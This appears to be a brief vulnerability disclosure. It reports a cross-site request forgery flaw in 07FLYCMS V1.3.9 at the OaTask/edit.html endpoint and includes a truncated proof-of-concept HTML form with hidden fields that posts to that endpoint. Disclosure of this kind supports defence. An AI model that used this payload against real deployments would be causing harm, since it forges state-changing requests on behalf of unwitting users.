...
07FLYCMS V1.3.9 was discovered to contain a Cross-Site Request Forgery (CSRF) via the component  http://erp.07fly.net:80/oa/OaTask/edit.html
...
<html>
  ...
  <script>history.pushState('', '', '/')</script>
    <form action="http://erp.07fly.net:80/oa/OaTask/edit.html" method="POST">
      <input type="hidden" name="id" value="28" />
<input type="hidden" name="name" value="cs" />
<input type="hidden" name="level" value="" />
<input type="hidden" name="start_time" value="2024-10-17+21%3A04%3A48" />
<input type="hidden" name="end_time" value="2024-10-17+21%3A04%3A49" />
